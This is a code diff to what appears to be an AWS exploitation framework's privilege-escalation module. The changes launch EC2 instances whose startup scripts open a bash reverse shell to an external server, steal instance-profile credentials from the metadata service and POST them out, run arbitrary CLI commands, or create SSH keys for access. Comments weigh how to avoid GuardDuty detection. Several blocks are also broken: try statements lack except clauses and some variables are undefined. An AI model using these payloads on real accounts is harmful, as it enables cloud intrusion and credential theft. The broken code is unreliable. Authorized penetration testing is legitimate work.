@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 import argparse
+from botocore.exceptions import ClientError
+import string
 from copy import deepcopy
 import json
 import os
@@ -820,17 +822,133 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
     # Could reverse shell on startup, but would require user to have a server listening+outbound internet (no guardduty trigger if could make aws calls from the reverse shell)
     # Could run an AWS command on startup, but would require outbound internet (No guardduty trigger)
     # Could post the keys to a web server, but would require user to have a server listening+outbound internet (would trigger guardduty after using the keys outside the instance)
-    client = pacu_main.get_boto3_client('ec2', region)
-    client.run_instances(
-        ImageId=ami,
-        MaxCount=1,
-        MinCount=1,
-        InstanceType='t2.micro',
-        IamInstanceProfile={
-            'Arn': instance_profile['Arn'],
-            'Name': instance_profile['InstanceProfileName']
-        }
-    )
+
+    ready_to_start = False
+
+    while not ready_to_start:
+        print('Ready to start the new EC2 instance. What would you like to do?')
+        print('  1) Open a reverse shell on the instance back to a server you control. Note: Restart the instance to resend the reverse shell connection (will not trigger GuardDuty, requires outbound internet).')
+        print('  2) Run an AWS CLI command using the instance profile credentials on startup. Note: Restart the instance to run the command again (will not trigger GuardDuty, requires outbound internet).')
+        print('  3) Make an HTTP POST request with the instance profiles credentials on startup. Note: Restart the instance to get a fresh set of credentials sent to you(will trigger GuardDuty finding type UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration when using the keys outside the EC2 instance, requires outbound internet).')
+        print('  4) Try to create an SSH key through AWS, allowing you SSH access to the instance (requires inbound access to port 22).')
+        print('  5) Skip this privilege escalation method.')
+        method = int(input('Choose one [1-5]: '))
+
+        if method == 1:
+            # Reverse shell
+            external_server = input('The EC2 instance will try to connect to your server using a bash reverse shell. To listen for this, run the command "nc -nlvp <an open port>" from your server where port <an open port> is open to accept the connection. What is the IP and port of your server (example: 127.0.0.1:80)? ')
+            reverse_shell = 'bash -i >& /dev/tcp/{} 0>&1'.format(external_server.rstrip().replace(':', '/'))
+            try:
+                response = client.run_instances(
+                    ImageId=ami,
+                    UserData='#cloud-boothook\n#!/bin/bash\n{}'.format(reverse_shell),
+                    MaxCount=1,
+                    MinCount=1,
+                    InstanceType='t2.micro',
+                    IamInstanceProfile={
+                        'Arn': instance_profile['Arn']
+                    }
+                )
+
+                print('Successfully created the EC2 instance, you should receive a reverse connection to your server soon (may take up to 5 minutes in some cases).\n')
+                print('  Instance details:')
+                print(response)
+
+                return True
+        elif method == 2:
+            # Run AWS CLI command
+            aws_cli_command = input('What is the AWS CLI command you would like to execute (example: "aws iam get-user --user-name Bob")? ')
+            try:
+                response = client.run_instances(
+                    ImageId=ami,
+                    UserData='#cloud-boothook\n#!/bin/bash\n{}'.format(aws_cli_command),
+                    MaxCount=1,
+                    MinCount=1,
+                    InstanceType='t2.micro',
+                    IamInstanceProfile={
+                        'Arn': instance_profile['Arn']
+                    }
+                )
+
+                print('Successfully created the EC2 instance, your AWS CLI command should run soon (may take up to 5 minutes in some cases).\n')
+                print('  Instance details:')
+                print(response)
+
+                return True
+        elif method == 3:
+            # HTTP POST
+            http_server = input('The EC2 instance will make an HTTP POST request to your server containing temporary credentials for the instance profile. Where should this data be POSTed (example: http://my-server.com/creds)? ')
+            try:
+                response = client.run_instances(
+                    ImageId=ami,
+                    UserData='#cloud-boothook\n#!/bin/bash\nip_name=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)\nkeys=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ip_name)\ncurl -X POST -d "$keys" {}'.format(http_server),
+                    MaxCount=1,
+                    MinCount=1,
+                    InstanceType='t2.micro',
+                    IamInstanceProfile={
+                        'Arn': instance_profile['Arn']
+                    }
+                )
+
+                print('Successfully created the EC2 instance, you should receive a POST request with the instance credentials soon (may take up to 5 minutes in some cases).\n')
+                print('  Instance details:')
+                print(response)
+
+                return True
+            except Exception as error:
+                print('Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n'.format(error))
+                return False
+        elif method == 4:
+            # Create SSH key
+            ssh_key_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+            client = pacu_main.get_boto3_client('ec2', region)
+            try:
+                response = client.create_key_pair(
+                    KeyName=ssh_key_name,
+                    DryRun=True
+                )
+            except ClientError as error:
+                if not str(error).find('UnauthorizedOperation') == -1:
+                    print('Dry run failed, you do not have permission to create an SSH key. Try a different method.\n')
+                    continue
+            response = client.create_key_pair(
+                KeyName=ssh_key_name
+            )
+            ssh_private_key = response['KeyMaterial']
+            ssh_fingerprint = response['KeyFingerprint']
+
+            try:
+                response = client.run_instances(
+                    ImageId=ami,
+                    KeyName=ssh_key_name,
+                    MaxCount=1,
+                    MinCount=1,
+                    InstanceType='t2.micro',
+                    IamInstanceProfile={
+                        'Arn': instance_profile['Arn']
+                    }
+                )
+
+                print('Successfully created the EC2 instance, you can now SSH in using the private key printed below.\n')
+                print('  Instance details:')
+                print(response)
+
+                with open('./sessions/{}/downloads/{}'.format(session.name, ssh_key_name), 'w+') as priv_key_file:
+                    priv_key_file.write(ssh_private_key)
+                print('  SSH private key (also saved to ./sessions/{}/downloads/{}):'.format(session.name, ssh_key_name))
+                print(ssh_private_key)
+                
+                print('  SSH fingerprint:')
+                print(ssh_fingerprint)
+
+                return True
+            except Exception as error:
+                print('Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n'.format(error))
+                return False
+        else:
+            # Skip
+            print('Skipping to next privilege escalation method...\n')
+            return False
 
 
 
